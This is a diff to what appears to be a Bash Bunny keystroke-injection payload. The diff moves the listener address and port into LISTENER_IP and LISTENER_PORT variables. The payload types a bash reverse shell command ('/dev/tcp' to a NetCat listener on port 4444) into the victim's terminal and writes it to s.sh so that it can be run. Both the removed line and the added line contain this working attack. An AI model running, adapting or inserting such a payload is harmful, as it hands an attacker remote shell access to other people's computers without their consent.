@@ -14,6 +14,12 @@
 # Green (blinking)..........Working
 # White.....................Completed without error
 
+# Edit this to point to the  NetCat Listener
+LISTENER_IP="192.168.1.100"
+LISTENER_PORT="4444"
+
+#----Proceed with Caution------------------------------------------------------
+
 # Green blinking LED
 LED G 100
 
@@ -32,8 +38,8 @@ QUACK ENTER
 # Give the terminal window a second to pop up
 QUACK DELAY 1000
 
-# Bash Reverse Shell into a script 's.sh' *** Edit IP Address and Port ***
-QUACK STRING echo \"bash -i \>\& /dev/tcp/192.168.1.100/4444 0\>\&1\" \> s.sh
+# Bash Reverse Shell into a script 's.sh'
+QUACK STRING echo \"bash -i \>\& /dev/tcp/${LISTENER_IP}/${LISTENER_PORT} 0\>\&1\" \> s.sh
 QUACK ENTER
 
 # Change file permissions to allow execution
